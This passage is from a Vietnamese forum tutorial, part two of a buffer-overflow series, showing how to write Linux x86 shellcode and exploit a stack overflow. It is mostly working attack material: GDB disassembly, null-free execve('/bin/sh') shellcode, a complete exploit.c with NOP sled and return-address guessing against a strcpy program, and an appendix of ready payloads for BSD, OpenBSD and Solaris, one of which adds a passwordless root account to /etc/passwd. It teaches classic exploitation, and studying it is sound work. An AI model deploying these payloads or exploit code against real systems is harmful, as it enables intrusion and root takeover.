copies of it under certain conditions.<br/> Type "show copying" to see the conditions.<br/> There is absolutely no warranty for GDB. Type "show warranty" for details.<br/> This GDB was configured as "i386-mandrake-linux"...<br/> (gdb) disas main<br/> Dump of assembler code for function main:<br/> 0x8000130 : pushl %ebp<br/> 0x8000131 : movl %esp,%ebp<br/> 0x8000133 : jmp 0x800015f <br/> 0x8000135 : popl %esi<br/> 0x8000136 : movl %esi,0x8(%esi)<br/> 0x8000139 : movb $0x0,0x7(%esi)<br/> 0x800013d : movl $0x0,0xc(%esi)<br/> 0x8000144 : movl $0xb,%eax<br/> 0x8000149 : movl %esi,%ebx<br/> 0x800014b : leal 0x8(%esi),%ecx<br/> 0x800014e : leal 0xc(%esi),%edx<br/> 0x8000151 : int $0x80<br/> 0x8000153 : movl $0x1,%eax<br/> 0x8000158 : movl $0x0,%ebx<br/> 0x800015d : int $0x80<br/> 0x800015f : call 0x8000135 <br/> 0x8000164 : das<br/> 0x8000165 : boundl 0x6e(%ecx),%ebp<br/> 0x8000168 : das<br/> 0x8000169 : jae 0x80001d3 &lt;__new_exitfn+55&gt;<br/> 0x800016b : addb %cl,0x55c35dec(%ecx)<br/> End of assembler dump.<br/> (gdb) x/bx main+3<br/> 0x8000133 : 0xeb<br/> (gdb)<br/> 0x8000134 : 0x2a<br/> (gdb)<br/> .<br/> .<br/> .<br/> (gdb) quit<br/> Ghi chú: x/bx dùng để hiển thị mã máy ở dạng hexa của lệnh hợp ngữ<br/> <br/> Bây giờ bạn hãy test thử shellcode đầu tiên:<br/> <br/> testsc1.c<br/> ------------------------------------------------------------------------------<br/> char shellcode[] =<br/> "\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00"<br/> "\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"<br/> "\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff"<br/> "\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3";<br/> <br/> void main() {<br/> int *ret;<br/> <br/> ret = (int *)&ret + 2;<br/> (*ret) = (int)shellcode;<br/> <br/> }<br/> ------------------------------------------------------------------------------<br/> <br/> [đt@localhost ~/vicki]$ cc -o testsc1 testsc1.c<br/> [đt@localhost ~/vicki]$ ./testsc1<br/> sh-2.04$ exit<br/> [đt@localhost ~/vicki]$<br/> Nó đã làm việc! Tuy nhiên có một vấn đề lớn trong shellcode đầu tiên. Shellcode này có chứa \x00. Chúng ta sẽ thất bại nếu dùng shellcode này để làm tràn bộ đệm. Vì sao? Hàm strcpy() sẽ chấm dứt copy khi gặp \x00 nên shellcode sẽ không được copy trọn vẹn vào buffer! Chúng ta cần gở bỏ hết \x00 trong shellcode:<br/> <br/> Câu lệnh gặp vấn đề: Được thay thế bằng:<br/> --------------------------------------------------------<br/> movb $0x0,0x7(%esi) xorl %eax,%eax<br/> molv $0x0,0xc(%esi) movb %eax,0x7(%esi)<br/> movl %eax,0xc(%esi)<br/> --------------------------------------------------------<br/> movl $0xb,%eax movb $0xb,%al<br/> --------------------------------------------------------<br/> movl $0x1, %eax xorl %ebx,%ebx<br/> movl $0x0, %ebx movl %ebx,%eax<br/> inc %eax<br/> --------------------------------------------------------<br/> Shellcode mới!<br/> <br/> shellcodeasm2.c<br/> ------------------------------------------------------------------------------<br/> void main() {<br/> __asm__("<br/> jmp 0x1f # 2 bytes<br/> popl %esi # 1 byte<br/> movl %esi,0x8(%esi) # 3 bytes<br/> xorl %eax,%eax # 2 bytes<br/> movb %eax,0x7(%esi) # 3 bytes<br/> movl %eax,0xc(%esi) # 3 bytes<br/> movb $0xb,%al # 2 bytes<br/> movl %esi,%ebx # 2 bytes<br/> leal 0x8(%esi),%ecx # 3 bytes<br/> leal 0xc(%esi),%edx # 3 bytes<br/> int $0x80 # 2 bytes<br/> xorl %ebx,%ebx # 2 bytes<br/> movl %ebx,%eax # 2 bytes<br/> inc %eax # 1 bytes<br/> int $0x80 # 2 bytes<br/> call -0x24 # 5 bytes<br/> .string \"/bin/sh\" # 8 bytes<br/> # 46 bytes total<br/> ");<br/> }<br/> ------------------------------------------------------------------------------<br/> Test shellcode mới!<br/> <br/> testsc2.c<br/> ------------------------------------------------------------------------------<br/> char shellcode[] =<br/> "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"<br/> "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"<br/> "\x80\xe8\xdc\xff\xff\xff/bin/sh";<br/> <br/> void main() {<br/> int *ret;<br/> <br/> ret = (int *)&ret + 2;<br/> (*ret) = (int)shellcode;<br/> <br/> }<br/> ------------------------------------------------------------------------------<br/> [đt@localhost ~/vicki]$ cc -o testsc2 testsc2.c<br/> [đt@localhost ~/vicki]$ ./testsc2<br/> sh-2.04$ exit<br/> [đt@localhost ~/vicki]$<br/> Viết tràn bộ đệm<br/> <br/> Ví dụ 1:<br/> <br/> overflow.c<br/> ------------------------------------------------------------------------------<br/> char shellcode[] =<br/> "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"<br/> "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"<br/> "\x80\xe8\xdc\xff\xff\xff/bin/sh";<br/> <br/> char large_string[128];<br/> <br/> void main() {<br/> char buffer[96];<br/> int i;<br/> long *long_ptr = (long *) large_string;<br/> <br/> for (i = 0; i &lt; 32; i++)<br/> *(long_ptr + i) = (int) buffer;<br/> <br/> for (i = 0; i &lt; strlen(shellcode); i++)<br/> large_string[i] = shellcode[i];<br/> <br/> strcpy(buffer,large_string);<br/> }<br/> ------------------------------------------------------------------------------<br/> [đt@localhost ~/vicki]$ cc -o overflow overflow.c<br/> [đt@localhost ~/vicki]$ ./overflow<br/> sh-2.04$ exit<br/> [đt@localhost ~/vicki]$<br/> * Giải thích:<br/> <br/> đỉnh của +--------------+ đáy của +----------------+ đỉnh của<br/> bộ nhớ | ret addr | stack | addr(buffer) | bộ nhớ <br/> +--------------+ | addr(buffer) |<br/> | ebp | | ... |<br/> +--------------+ | addr(buffer) |<br/> | | | addr(buffer) | large_string[128]<br/> | buffer[96] | | addr(buffer) |<br/> | | | |<br/> +--------------+ | shellcode | <br/> | long_ptr | --------------&gt; | |<br/> đáy của +--------------+ đỉnh của +----------------+ đáy của<br/> bộ nhớ stack bộ nhớ<br/> <br/> STACK HEAP<br/> char large_string[128]; //cấp phát một vùng nhớ 128 bytes trên HEAP<br/> <br/> long *long_ptr = (long *) large_string; // cho long_ptr trỏ đến đầu mảng large_string[]<br/> <br/> for (i=0; i&lt;32; i++)<br/> *(long_ptr+i) = (int)buffer; //lắp đầy mảng large_string[] bằng địa chỉ của mảng buffer[]<br/> <br/> for (i=0; i&lt;strlen(shellcode); i++)<br/> large_string[i] = shellcode[i]; //đẩy shellcode vào phần đầu của mảng large_string[]<br/> <br/> strcpy(buffer, large_string); //copy large_string vào buffer... làm tràn bộ đệm<br/> <br/> Trước hết chúng ta khởi tạo một mảng large_string[] có kích thước lớn hơn buffer[] trên HEAP. Tiếp theo lắp đầy large_string[] bằng địa chỉ của buffer[]. Shellcode sẽ được gắn vào phần đầu của large_string[]. Khi hàm strcpy được thực hiện, nó sẽ copy large_string vào buffer. Bởi vì large_string quá lớn nên nó sẽ ghi đè lên ebp và return addr. Phần trên của mảng large_string toàn là địa chỉ của buffer[] - addr(buffer) nên return addr sẽ trỏ đến buffer[0]. Mà nằm ngay ở phần đầu của buffer lại chính là shellcode(do ta đã copy large_string vào buffer bằng hàm strcpy), nên shellcode sẽ được thi hành, nó sẽ đổ ra một shell lệnh.<br/> <br/> Ví dụ 2:<br/> <br/> Để viết tràn bộ đệm, bạn phải biến địa chỉ của buffer trên stack. Thật may cho chúng ta là hầu như tất cả các chương trình đều có cùng địa chỉ bắt đầu stack. Chúng ta có thể lấy được địa chỉ bắt đầu của stack qua chương trình sau:<br/> <br/> sp.c<br/> ------------------------------------------------------------------------------<br/> unsigned long get_sp(void) {<br/> __asm__("movl %esp,%eax");<br/> }<br/> void main() {<br/> printf("0x%x\n", get_sp());<br/> }<br/> ------------------------------------------------------------------------------<br/> [đt@localhost ~/vicki]$ cc -o sp sp.c<br/> [đt@localhost ~/vicki]$ ./sp<br/> 0xbffffb07<br/> [đt@localhost ~/vicki]$<br/> Giả sử chương trình mà chúng ta cố làm tràn bộ đệm như sau:<br/> <br/> vulnerable.c<br/> ----------------------------------------------<br/> int main(int argc, char *argv[])<br/> { <br/> char buffer[500];<br/> if(argc&gt;=2) strcpy(buffer, argv[1]);<br/> return 0;<br/> }<br/> ----------------------------------------------<br/> Đây là chương trình exploit.c. exploit sẽ làm tràn bộ đệm của vulnerable và buộc vulnerable đổ một shell lệnh cho chúng ta.<br/> <br/> exploit.c<br/> ------------------------------------------------------------------------------<br/> #include &lt;stdlib.h&gt;<br/> #define BUFFERSIZE 600<br/> #define OFFSET 0<br/> #define NOP 0x90<br/> <br/> char shellcode[] =<br/> "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"<br/> "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"<br/> "\x80\xe8\xdc\xff\xff\xff/bin/sh";<br/> <br/> unsigned long get_esp(void)<br/> {<br/> __asm__("movl %esp, %eax");<br/> }<br/> <br/> int main(int argc, char *argv[])<br/> {<br/> int i, offset=OFFSET, bsize=BUFFERSIZE;<br/> long esp, ret, *addr_ptr;<br/> char *buffer, *ptr, *osptr;<br/> <br/> if (argc&gt;1) bsize=atoi(argv[1]);<br/> if (argc&gt;2) offset=atoi(argv[2]);<br/> <br/> esp=get_esp();<br/> ret=esp-offset;<br/> <br/> printf("Stack pointer: 0x%x\n",esp);<br/> printf("Offset : 0x%x\n",offset);<br/> printf("Return addr : 0x%x\n",ret);<br/> <br/> if (!(buffer=malloc(bsize)))<br/> {<br/> printf("Khong the cap phat bo nho.\n");<br/> exit(-1);<br/> }<br/> <br/> ptr=buffer;<br/> addr_ptr=(long *)ptr;<br/> for (i=0;i&lt;bsize;i+=4)<br/> *(addr_ptr++)=ret;<br/> <br/> for (i=0;i&lt;bsize/2;i++)<br/> buffer[i]=NOP;<br/> <br/> ptr=buffer+((bsize/2)-(strlen(shellcode)/2));<br/> for (i=0;i&lt;strlen(shellcode);i++)<br/> *(ptr++)=shellcode[i];<br/> <br/> buffer[bsize-1]=0;<br/> execl("./vulnerable","vulnerable",buffer,0);<br/> }<br/> ------------------------------------------------------------------------------<br/> [đt@localhost ~/vicki]$ cc -o vulnerable vulnerable.c<br/> [đt@localhost ~/vicki]$ cc -o exploit exploit.c<br/> [đt@localhost ~/vicki]$ ./exploit<br/> Stack pointer: 0xbffffaf8<br/> Offset : 0x0<br/> Return addr : 0xbffffaf8<br/> <br/> sh-2.04$<br/> Giải thích:<br/> <br/> Trước hết, chúng ta cần xác định địa chỉ trở về khi tràn bộ đệm.<br/> <br/> esp=get_esp();<br/> ret=esp-offset; <br/> <br/> Địa chỉ trở về khi tràn bộ đệm = ESP(địa chỉ bắt đầu của stack) - OFFSET . Tại sao phải trừ cho offset? Bởi vì chúng ta có gọi hàm execl("./vulnerable","vulnerable",buffer,0); sau cùng, nên ESP lúc này sẽ bị trừ đi một số bytes do chương trình exploit có sử dụng một số bytes trên stack cho các tham số và biến cục bộ của hàm.Điều này sẽ tăng khả năng địa chỉ trở về trỏ đến một nơi nào đó trong buffer[] của vulnerable, nơi mà chúng ta sẽ đặt NOPs và shellcode. <br/> <br/> Quan sát stack: <br/> <br/> +---------------+<br/> | argv[] & argc |<br/> | của exploit |<br/> +---------------+<br/> | return addr 1 |<br/> +---------------+<br/> | ebp 1 |<br/> +---------------+<br/> | |<br/> | các biến cục |<br/> | bộ của exploit|<br/> | |<br/> +---------------+<br/> | argv[] & argc |<br/> | của exploit |<br/> +---------------+<br/> | return addr 2 | ----\<br/> +---------------+ |<br/> | ebp 2 | |<br/> +---------------+ |<br/> | | |<br/> | buffer[] của | |<br/> | vulnerable | &lt;---/<br/> | |<br/> +---------------+<br/> Chúng ta cần làm tràn buffer[] của vulnerable để return addr 2 trỏ đến đâu đó trong buffer[]. Cũng như ví dụ 1- overflow.c(bạn hãy xem lại thật kĩ ví dụ 1), chúng ta sẽ tạo một vùng nhớ trên heap:<br/> <br/> if (!(buffer=malloc(bsize)))<br/> {<br/> printf("Khong the cap phat bo nho.\n");<br/> exit(-1);<br/> }<br/> Bây giờ lắp đầy buffer bằng địa chỉ trở về mà chúng ta đã tính được:<br/> <br/> ptr=buffer;<br/> addr_ptr=(long *)ptr;<br/> for (i=0;i&lt;bsize;i+=4)<br/> *(addr_ptr++)=ret;<br/> Tiếp theo chúng ta sẽ lắp đầy 1/2 buffer bằng NOPs<br/> <br/> for (i=0;i&lt;bsize/2;i++)<br/> buffer[i]=NOP;<br/> Sau đó, chúng ta đặt shellcode vào giữa NOPs<br/> <br/> ptr=buffer+((bsize/2)-(strlen(shellcode)/2));<br/> for (i=0;i&lt;strlen(shellcode);i++)<br/> *(ptr++)=shellcode[i];<br/> Cuối cùng đặt '\0' vào buffer để hàm strcpy() trong vulnerable biết đã hết data cần copy.<br/> <br/> buffer[bsize-1]=0;<br/> Tiến hành làm tràn bộ đệm của vulnerable, bạn sẽ có được shell lệnh do vulnerable spawn.<br/> <br/> execl("./vulnerable","vulnerable",buffer,0);<br/> Quan sát stack, buffer[] của vulnerable và return addr 2 sau khi tràn bộ đệm sẽ có dạng như sau:<br/> <br/> +------------+<br/> |return addr2| -----\<br/> +------------+ |<br/> | ebp 2 | |<br/> +------------+ |<br/> | ... | |<br/> | nop | |<br/> | ... | |<br/> | shellcode | |<br/> | ... | |<br/> | nop | |<br/> | nop | &lt;----/<br/> | nop |<br/> | ... |<br/> +------------+<br/> Chúng ta hi vọng rằng return addr 2 sẽ trỏ đến 1 nop trước shellcode. Các câu lệnh NOPs sẽ không làm gì hết, đến khi gặp shellcode, shellcode sẽ đổ shell lệnh cho chúng ta(bạn hãy xem lại phần "Hình dung cách đặt shellcode trên stack).<br/> <br/> Phụ lục<br/> <br/> Các loại shellcode<br/> <br/> BSDi<br/> <br/> char code[] =<br/> "\xeb\x57\x5e\x31\xdb\x83\xc3\x08\x83\xc3\x02\x88\x5e"<br/> "\x26\x31\xdb\x83\xc3\x23\x83\xc3\x23\x88\x5e\xa8\x31"<br/> "\xdb\x83\xc3\x26\x83\xc3\x30\x88\x5e\xc2\x31\xc0\x88"<br/> "\x46\x0b\x89\xf3\x83\xc0\x05\x31\xc9\x83\xc1\x01\x31"<br/> "\xd2\xcd\x80\x89\xc3\x31\xc0\x83\xc0\x04\x31\xd2\x88"<br/> "\x56\x27\x89\xf1\x83\xc1\x0c\x83\xc2\x1b\xcd\x80\x31"<br/> "\xc0\x83\xc0\x06\xcd\x80\x31\xc0\x83\xc0\x01\xcd\x80"<br/> "BIN/SH";<br/> <br/> FreeBSD<br/> <br/> char code[]=<br/> "\xeb\x37\x5e\x31\xc0\x88\x46\xfa\x89\x46\xf5\x89\x36\x89\x76"<br/> "\x04\x89\x76\x08\x83\x06\x10\x83\x46\x04\x18\x83\x46\x08\x1b"<br/> "\x89\x46\x0c\x88\x46\x17\x88\x46\x1a\x88\x46\x1d\x50\x56\xff"<br/> "\x36\xb0\x3b\x50\x90\x9a\x01\x01\x01\x01\x07\x07\xe8\xc4\xff"<br/> "\xff\xff\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02"<br/> "\x02\x02\x02/bin/sh.-c.sh";<br/> <br/> Replace .sh with .anycommand<br/> <br/> Linux x86<br/> <br/> char shellcode[] =<br/> "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"<br/> "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"<br/> "\x80\xe8\xdc\xff\xff\xff/bin/sh";<br/> <br/> OpenBSD<br/> <br/> OpenBSD shellcode that adds an unpassworded root login<br/> "w00w00" to /etc/passwd... Courtesy of w00w00.<br/> (Changed from /tmp/passwd to /etc/passwd... give kiddies a chance <img src="/hvaonline/images/smilies/068ae40523a24c9ef54edefd375e542d.gif" border="0" alt="smilie" align="absbottom"><br/> <br/> char shell[]=<br/> "\xeb\x2b\x5e\x31\xc0\x88\x46\x0b"<br/> "\x88\x46\x29\x50\xb0\x09\x50\x31"<br/> "\xc0\x56\x50\xb0\x05\xcd\x80\x89"<br/> "\xc3\x6a\x1d\x8d\x46\x0c\x50\x53"<br/> "\x50\x31\xc0\xb0\x04\xcd\x80\x31"<br/> "\xc0\xb0\x01\xcd\x80\xe8\xd0\xff"<br/> "\xff\xff\x2f\x65\x74\x63\x2f\x70"<br/> "\x61\x73\x73\x77\x64\x30\x77\x30"<br/> "\x30\x77\x30\x30\x3a\x3a\x30\x3a"<br/> "\x30\x3a\x77\x30\x30\x77\x30\x30"<br/> "\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f"<br/> "\x73\x68\x0a\x30\xff\xff\xff\xff"<br/> "\xff\xff\xff\xff\xff\xff\xff\xff"<br/> "\xff\xff\xff\xff\xff\xff\xff\xff";<br/> <br/> Solaris / Sparc<br/> <br/> char c0de[] =<br/> /* setreuid() */<br/> "\x82\x10\x20\xca" /* mov 0xca, %g1 */<br/> "\x92\x1a\x40\x09" /* xor %o1, %o1, %o1 */<br/> "\x90\x0a\x40\x09" /* and %o1, %o1, %o0 */<br/> "\x91\xd0\x20\x08" /* ta 8 */<br/> "\x2d\x0b\xd8\x9a" /* sethi $0xbd89a, %l6 */<br/> "\xac\x15\xa1\x6e" /* or %l6, 0x16e, %l6 */<br/> "\x2f\x0b\xdc\xda" /* sethi $0xbdcda, %l7 */<br/> "\x90\x0b\x80\x0e" /* and %sp, %sp, %o0 */<br/> "\x92\x03\xa0\x08" /* add %sp, 8, %o1 */<br/> "\x94\x1a\x80\x0a" /* xor %o2, %o2, %o2 */<br/> "\x9c\x03\xa0\x10" /* add %sp, 0x10, %sp */<br/> "\xec\x3b\xbf\xf0" /* std %l6, [%sp - 0x10] */<br/> "\xdc\x23\xbf\xf8" /* st %sp, [%sp - 0x08] */<br/> "\xc0\x23\xbf\xfc" /* st %g0, [%sp - 0x04] */<br/> "\x82\x10\x20\x3b" /* mov $0x3b, %g1 */<br/> "\x91\xd0\x20\x08" /* ta 8 <br/> <br/> Solaris / x86<br/> <br/> char c0de[] = <br/> <br/> "\xeb\x0a" /* jmp initcall */<br/> "\x9a\x01\x02\x03\x5c\x07\x04" /* lcall */<br/> "\xc3" /* ret */<br/> "\xeb\x05" /* jmp setuidcode */<br/> "\xe8\xf9\xff\xff\xff" /* call jmpz */<br/> "\x5e" /* popl %esi */<br/> "\x29\xc0" /* subl %eax, %eax */<br/> "\x88\x46\xf7" /* movb %al, 0xfffffff7(%esi) */<br/> "\x89\x46\xf2" /* movl %eax, 0xfffffff2(%esi) */<br/> "\x50" /* pushl %eax */<br/> "\xb0\x8d" /* movb $0x8d, %al */<br/> "\xe8\xe0\xff\xff\xff" /* call initlcall */<br/> "\x29\xc0" /* subl %eax, %eax */<br/> "\x50" /* pushl %eax */<br/> "\xb0\x17" /* movb $0x17, %al */<br/> "\xe8\xd6\xff\xff\xff" /* call initlcall */<br/> "\xeb\x1f" /* jmp callz */<br/> "\x5e" /* popl %esi */<br/> "\x8d\x1e" /* leal (%esi), %ebx */<br/> "\x89\x5e\x0b" /* movl %ebx, 0x0b(%esi) */<br/> "\x29\xc0" /* subl %eax, %eax */<br/> "\x88\x46\x19" /* movb %al, 0x19(%esi) */<br/> "\x89\x46\x14" /* movl %eax, 0x14(%esi) */<br/> "\x89\x46\x0f" /* movl %eax, 0x0f(%esi) */<br/> "\x89\x46\x07" /* movl %eax, 0x07(%esi) */<br/> "\xb0\x3b" /* movb $0x3b, %al */<br/> "\x8d\x4e\x0b" /* leal 0x0b(%esi), %ecx */<br/> "\x51" /* pushl %ecx */<br/> "\x51" /* pushl %ecx */<br/> "\x53" /* pushl %ebx */<br/> "\x50" /* pushl %eax */<br/> "\xeb\x18" /* jmp lcall */<br/> "\xe8\xdc\xff\xff\xff" /* call start */<br/> "\x2f\x62\x69\x6e\x2f\x73\x68" /* /bin/sh */<br/> "\x01\x01\x01\x01\x02\x02\x02\x02\x03\x03\x03\x03"<br/> "\x9a\x04\x04\x04\x04\x07\x04"; /* lcall */<br/> <br/> Công cụ tạo shellcode "Hellkit"<br/> <br/> Hellkit là một công cụ dùng tạo shellcode cho Linux rất dễ dùng. Hellkit rất đa năng, đặc biệt Hellkit còn cho phép tạo shellcode có kích thước lên đến 65535 bytes!<br/> <br/> Tài liệu tham khảo<br/> <br/> "Smashing The Stack For Fun And Profit"(phrack 49-14) - Aleph One<br/> "Advanced buffer overflow exploits" - Taeho Oh <br/> <br/> Do hiểu biết còn nhiều hạn chế nên bài viết này không tránh khỏi những thiếu xót, rất mong nhận được sự đóng góp, giúp đỡ của các bạn để bài viết được hoàn thiện hơn. Thanks</div>
						</td>
					</tr>

					<tr>
						<td align="left"><a href="http://digg.com/submit?phrase=2&url=http://www.hvaonline.net/hvaonline/readingRoom/item/1107.html"><img src="/hvaonline/templates/viet/images/digg.gif" align="texttop" alt="[digg]" title="[digg]"></a>
<a href="http://del.icio.us/post?url=http://www.hvaonline.net/hvaonline/readingRoom/item/1107.html"><img src="/hvaonline/templates/viet/images/delicious.gif" align="texttop" alt="[delicious]" title="[delicious]"></a>
<a href="http://www.google.com/bookmarks/mark?op=edit&output=popup&bkmk=http://www.hvaonline.net/hvaonline/readingRoom/item/1107.html"><img src="/hvaonline/templates/viet/images/google.gif" align="texttop" alt="[google]" title="[google]"></a>
<a href="http://bookmarks.yahoo.com/toolbar/savebm?opener=tb&u=http://www.hvaonline.net/hvaonline/readingRoom/item/1107.html"><img src="/hvaonline/templates/viet/images/yahoo.gif" align="texttop" alt="[yahoo]" title="[yahoo]"></a>
<a href="http://technorati.com/faves?add=http://www.hvaonline.net/hvaonline/readingRoom/item/1107.html"><img src="/hvaonline/templates/viet/images/technorati.gif" align="texttop" alt="[technorati]" title="[technorati]"></a>
<a href="http://reddit.com/submit?url=http://www.hvaonline.net/hvaonline/readingRoom/item/1107.html"><img src="/hvaonline/templates/viet/images/reddit.gif" align="texttop" alt="[reddit]" title="[reddit]"></a>
<a href="http://www.stumbleupon.com/submit?url=http://www.hvaonline.net/hvaonline/readingRoom/item/1107.html"><img src="/hvaonline/templates/viet/images/stumbleupon.gif" align="texttop" alt="[stumbleupon]" title="[stumbleupon]"></a></td>
					</tr>
				</table>
			</td>
		</tr>

		<tr>
			<td align="left" colspan="2" class="readingborderBottom">
				<table cellspacing="0" cellpadding="10" width="95%" align="center" border="0">
					<tr>
						<td align="left">
						<div class="postbody"><b>Other posts in the same group:</b></div><br />
									<div class="gen"><a href="/hvaonline/readingRoom/item/1087.html">Tìm hiểu đầy đủ về tràn bộ đệm</a></div>
									<div class="gen"><b>Tìm hiểu đầy đủ về tràn bộ đệm - II</b></div>
									<div class="gen"><a href="/hvaonline/readingRoom/item/1113.html">Tìm hiểu đầy đủ về tràn bộ đệm - III</a></div>
						</td>
					</tr>
				</table>
			</td>
		</tr>


		<tr>
			<td align="left" valign="top">
				<a href="#topPage"><img src="/hvaonline/templates/viet/images/goup.gif" align="absbottom" border="0" alt="Go to top" title="Go to top"></a>
				<a href="/hvaonline/posts/list/0/430.html#1107" target="_blank"><img src="/hvaonline/templates/viet/images/goright.gif" border="0" align="absbottom" alt="Go to original post" title="Go to original post"></a> 
				&nbsp;
			</td>
			<td align="right">	<table cellspacing="0" cellpadding="0" border="0">
		<tr>			  
			<td nowrap="nowrap">
				<form action="" name="f" id="f" accept-charset="UTF-8">
					<select onchange="if(this.options[this.selectedIndex].value > 0){ document.location = '/hvaonline/readingRoom/show/'+ this.options[this.selectedIndex].value +'.html'; }" name="select">
						<option value="0" selected="selected">Go to Category</option>	
						<option value="0">------------------------</option>	
								<option value="1">Defense</option>
								<option value="2">Exploit</option>
								<option value="3">Reverse Engineering</option>
								<option value="4">*nix</option>
								<option value="5">Windows</option>
								<option value="6">Networking</option>
								<option value="7">Others</option>
					</select>
				</form>
			</td>
		</tr>
	</table>
</td>
		</tr>
</table>
<script type="text/javascript">
		var ctlTop = false;
		var ctlBt = false;

		function activateControllerTop()
		{
			ctlTop = !ctlTop;
			document.getElementById("controllerTop").style.display = (ctlTop ? "" : "none");
			document.getElementById("controllerTop").style.display = (ctlTop ? "" : "none");
			document.getElementById("controllerTop").style.display = (ctlTop ? "" : "none");

			if (ctlTop) {
				document.location = document.location + "#ctlTop";
			}
		}

		function activateControllerBottom()
		{
			ctlBt = !ctlBt;
			document.getElementById("controllerBottom").style.display = (ctlBt ? "" : "none");
			document.getElementById("controllerBottom").style.display = (ctlBt ? "" : "none");
			document.getElementById("controllerBottom").style.display = (ctlBt ? "" : "none");

			if (ctlBt) {
				document.location = document.location + "#ctlBt";
			}
		}
</script>

	<tr>	
		<td align="center">
		<br>
					</td>
	</tr>

	<tr>
		<td align="center">
			<span class="copyright">Powered by JForum - Extended by <a href="MailTo:lienlac@hvaonline.net">HVAOnline</a><br>
			&nbsp;hvaonline.net&nbsp; | &nbsp;hvaforum.net&nbsp; | &nbsp;hvazone.net&nbsp; | &nbsp;hvanews.net&nbsp; | &nbsp;vnhacker.org<br>
			1999 - 2013 &copy;
			v2012|0504|218|
		  </span>
	  </td>
	</tr>
<iframe src="/hvaonline/templates/ping_session.jsp" height="0" width="0" frameborder="0" scrolling="no"></iframe>
</body>
</html>
